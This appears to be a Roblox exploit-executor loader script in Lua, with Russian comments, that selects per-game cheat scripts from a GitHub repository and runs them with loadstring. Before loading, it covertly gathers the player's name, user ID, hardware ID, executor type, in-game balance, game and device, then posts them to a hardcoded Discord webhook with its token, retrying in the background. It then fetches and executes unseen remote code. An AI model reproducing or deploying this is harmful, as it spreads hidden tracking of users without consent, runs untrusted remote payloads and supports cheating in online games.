local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local webhookURL = "https://discord.com/api/webhooks/1457102967604908157/7hOYVv5Hl3J93zqwL8SmDODEqsvbSDhknvP46hzFwjZZbykC_xhA19c3KA8VxrHMdNCp"

local player = game.Players.LocalPlayer
local playerName = player and player.Name or "Unknown"
local userId = player and player.UserId or 0
local scriptVersion = "1.3.0"
local maxRetries = 10

-- –ß—ë—Ç–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã
local function DetectDeviceType()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

local deviceType = DetectDeviceType()

-- HWID detection
local hwid = "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"
pcall(function()
    if syn and syn.gethwid then
        hwid = syn.gethwid()
    elseif gethwid then
        hwid = gethwid()
    elseif fluxus and getgenv and getgenv().fluxus then
        hwid = tostring(getgenv().fluxus.HWID or "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ")
    elseif delta and get_hw_id then
        hwid = tostring(get_hw_id())
    end
end)

local function GetExecutorName()
    local ok, exec = pcall(function()
        if syn and typeof(syn) == "table" then return "Synapse X" end
        if KRNL_LOADED or (KRNL and typeof(KRNL) == "table") then return "KRNL" end
        if fluxus and typeof(fluxus) == "table" then return "Fluxus" end
        if identifyexecutor and typeof(identifyexecutor) == "function" then
            local name = identifyexecutor()
            if name and name ~= "" then return name end
        end
        if WRD then return "WRD" end
        if getgenv then
            if getgenv().syn then return "Synapse X" end
            if getgenv().KRNL then return "KRNL" end
            if getgenv().fluxus then return "Fluxus" end
            if getgenv().WRD then return "WRD" end
        end
        if getrenv then
            local r = getrenv()
            if r and r.is_sentinel then return "Sentinel" end
            if r and r.is_oxygen then return "OxygenU" end
        end
        if secure_load then return "Secure Load" end
        return "Unknown"
    end)
    return ok and exec or "Unknown"
end
local executor = GetExecutorName()

-- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Ä–æ–≤–Ω—è –∏–Ω–∂–µ–∫—Ç–æ—Ä–∞
local function GetExecutorLevel()
    if syn and syn.crypto then return "Premium" end
    if KRNL and KRNL.VERSION then return "Stable" end
    if fluxus and fluxus.version then return "Free/Public" end
    if WRD then return "WRD" end
    if identifyexecutor and typeof(identifyexecutor) == "function" then
        local ok, val = pcall(identifyexecutor)
        if ok and typeof(val) == "string" and string.find(val:lower(),"pro") then
            return "Pro"
        end
    end
    return "Unknown"
end
local executorLevel = GetExecutorLevel()

local function FormatMoney(num)
    num = tonumber(num)
    if not num then return tostring(num) end
    if num >= 1e9 then
        return string.format("%.2f –º–ª—Ä–¥", num/1e9)
    elseif num >= 1e6 then
        return string.format("%.1f –º–ª–Ω", num/1e6)
    elseif num >= 1e3 then
        return string.format("%d —Ç—ã—Å", math.floor(num/1e3))
    else
        return tostring(num)
    end
end

local function TryGetRequest()
    return request or syn and syn.request or http and http.request or fluxus and fluxus.request or KRNL and KRNL.request or
        (getgenv and type(getgenv().request) == "function" and getgenv().request) or
        (typeof(http_request) == "function" and http_request) or
        (typeof(httprequest) == "function" and httprequest) or
        (typeof(http_request) == "table" and http_request) or
        function() error("–ù–µ—Ç —Å–æ–≤–º–µ—Å—Ç–∏–º–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è HTTP-–∑–∞–ø—Ä–æ—Å–∞!") end
end

local function HttpRequest(data)
    local json = HttpService:JSONEncode(data)
    local requestFunc = TryGetRequest()
    local success, result = pcall(function()
        return requestFunc({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
    if not success then
        return false, result
    end
    return true, result
end

local rawBalance = player and player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("–†—É–±–ª–∏") and player.leaderstats["–†—É–±–ª–∏"].Value or 0
local balance = FormatMoney(rawBalance)

local placeId = game.PlaceId or "Unknown"
local realGameName = "Unknown"
pcall(function()
    local info = MarketplaceService:GetProductInfo(placeId)
    realGameName = info and info.Name or tostring(placeId)
end)

local embedFields = {
    {name = "üë§ –ò–≥—Ä–æ–∫", value = playerName, inline = true},
    {name = "üÜî User ID", value = tostring(userId), inline = true},
    {name = "üíª Executor", value = executor, inline = true},
    {name = "üìà –£—Ä–æ–≤–µ–Ω—å –∏–Ω–∂–µ–∫—Ç–æ—Ä–∞", value = executorLevel, inline = false},
    {name = "üí∞ –ë–∞–ª–∞–Ω—Å", value = balance .. " —Ä—É–±", inline = false},
    {name = "üéÆ –ò–≥—Ä–∞", value = realGameName, inline = false},
    {name = "üîí HWID", value = hwid, inline = false},
    {name = "üñ•Ô∏è –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ", value = deviceType, inline = true},
}

local data = {
    content = "",
    embeds = {{
        title = "—Ç–µ—Å—Ç",
        color = 5793266,
        thumbnail = {url = "https://i.imgur.com/ElZJRNZ.png"},
        fields = embedFields,
        footer = {
            text = "v" .. scriptVersion .. " | " .. executor .. " | " .. os.date("%H:%M MSK"),
            icon_url = "https://i.imgur.com/ElZJRNZ.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local function SendWebhookWithRetry(data)
    local tries = 0
    while tries < maxRetries do
        local ok, result = pcall(HttpRequest, data)
        local success = false
        if ok and type(result) == "table" then
            if result.Success ~= nil then
                success = result.Success
            elseif result.StatusCode ~= nil then
                success = result.StatusCode == 204 or result.StatusCode == 200
            end
        elseif ok and type(result) == "boolean" then
            success = result
        elseif ok and result == nil then
            success = true
        end
        if success then
            break
        else
            tries = tries + 1
            wait(math.random(1, 2) + tries * 0.5)
        end
    end
end

coroutine.wrap(function()
    SendWebhookWithRetry(data)
end)()

local GAMES = {
    {
        name = "Casual Stock",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/casual%20stock",
        places = {
            13985151437,
            14145034258,
            15267035203
        }
    },

    {
        name = "The Lost Front",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/the%20lost%20front",
        places = {
            102871156420149,
            72299838142412,
            82702369391395
        }
    },

    {
        name = "Flick",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/flick",
        places = {
            136801880565837
        }
    },

    {
        name = "Cursed Tank Simulator",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/cursed%20tank%20sim",
        places = {
            6608498361,
            6925857548,
            17587823003,
            17820272411
        }
    },

    {
        name = "Counter Blox",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/counter%20blox",
        places = {
            301549746,
            1480424328,
            1869597719,
            5325113759
        }
    },

    {
        name = "VIOLENCE DISTRICT",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/dbd",
        places = {
            93978595733734
        }
    },

    {
        name = "Notoriety",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/Notoriety",
        places = {
            21532277,
            709461761,
            1213821265,
            1234408990,
            1242009557,
            1257393236,
            1269513822,
            1419274802,
            1448835396,
            1470780246,
            1549086835,
            2088934656,
            2511620169,
            2557847604,
            2591382751,
            2840013718,
            3107097964,
            5431100846,
            5431104427,
            5891659534,
            6537140247,
            10605039538,
            77388598821201,
            85131071821739,
            86300559848070,
            88314969485711,
            88467884212296,
            89087447777289,
            104434907248230,
            104518339645098,
            109437205431112,
            121625668096152,
            127121302275120,
            129817754677038
        }
    },

    {
        name = "Bubble Gum Simulator INFINITY",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/bubl%20gum%20sim",
        places = {
            80630096603395,
            85896571713843,
            98046029518959,
            127738893422250
        }
    },

    {
        name = "Escape Tsunami For Brainrots!",
        url  = "https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/Escape%20Tsunami%20for%20Brainrots",
        places = {
            131623223084840
        }
    }
}

local function UniversalHttpGet(url)
    local result

    -- game:HttpGet
    local ok, res = pcall(function()
        return game:HttpGet(url)
    end)
    if ok and type(res) == "string" and #res > 0 then
        result = res
    end

    -- syn.request
    if not result and syn and syn.request then
        ok, res = pcall(function()
            return syn.request({Url = url, Method = "GET"}).Body
        end)
        if ok and type(res) == "string" and #res > 0 then
            result = res
        end
    end

    -- http_request / httprequest / http
    if not result and (http_request or httprequest or http) then
        local req = http_request or httprequest or (http and http.request)
        if req then
            ok, res = pcall(function()
                return req({Url = url, Method = "GET"}).Body
            end)
            if ok and type(res) == "string" and #res > 0 then
                result = res
            end
        end
    end

    -- fluxus.request
    if not result and fluxus and fluxus.request then
        ok, res = pcall(function()
            return fluxus.request({Url = url, Method = "GET"}).Body
        end)
        if ok and type(res) == "string" and #res > 0 then
            result = res
        end
    end

    -- WRD
    if not result and WRD and WRD.Get then
        ok, res = pcall(function()
            return WRD.Get(url)
        end)
        if ok and type(res) == "string" and #res > 0 then
            result = res
        end
    end

    return result
end

-- –ü–æ–∏—Å–∫ –∏–≥—Ä—ã –ø–æ —Ç–µ–∫—É—â–µ–º—É PlaceId
local currentPlaceId = game.PlaceId
local gameConfig

for _, cfg in ipairs(GAMES) do
    for _, pid in ipairs(cfg.places) do
        if pid == currentPlaceId then
            gameConfig = cfg
            break
        end
    end
    if gameConfig then break end
end

if gameConfig then
    print("[Loader] –ò–≥—Ä–∞ –Ω–∞–π–¥–µ–Ω–∞: " .. gameConfig.name .. " (" .. tostring(currentPlaceId) .. ")")

    local scriptContent = UniversalHttpGet(gameConfig.url)
    if scriptContent and type(scriptContent) == "string" and #scriptContent > 0 then
        local func, lerr = loadstring(scriptContent)
        if func then
            local ok, err = pcall(func)
            if ok then
                print("[Loader] –°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω (—É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π —Å–ø–æ—Å–æ–±)")
            else
                warn("[Loader] –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ —Å–∫—Ä–∏–ø—Ç–∞:", err)
            end
        else
            warn("[Loader] –û—à–∏–±–∫–∞ loadstring:", lerr)
        end
    else
        -- Fallback –ø–æ –∏–º–µ–Ω–∏
        if gameConfig.name == "Casual Stock" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/casual%20stock"))()
        elseif gameConfig.name == "The Lost Front" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/the%20lost%20front"))()
        elseif gameConfig.name == "Flick" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/flick"))()
        elseif gameConfig.name == "Cursed Tank Simulator" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/cursed%20tank%20sim"))()
        elseif gameConfig.name == "Counter Blox" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/counter%20blox"))()
        elseif gameConfig.name == "VIOLENCE DISTRICT" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/dbd"))()
        elseif gameConfig.name == "Notoriety" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/Notoriety"))()
        elseif gameConfig.name == "Bubble Gum Simulator INFINITY" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/bubl%20gum%20sim"))()
        elseif gameConfig.name == "Escape Tsunami For Brainrots!" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dthghsdh030-spec/fdspfksda/refs/heads/main/Escape%20Tsunami%20for%20Brainrots"))()
        end
    end
else
    warn("[Loader] –°–∫—Ä–∏–ø—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω –¥–ª—è PlaceId: " .. tostring(currentPlaceId))
end
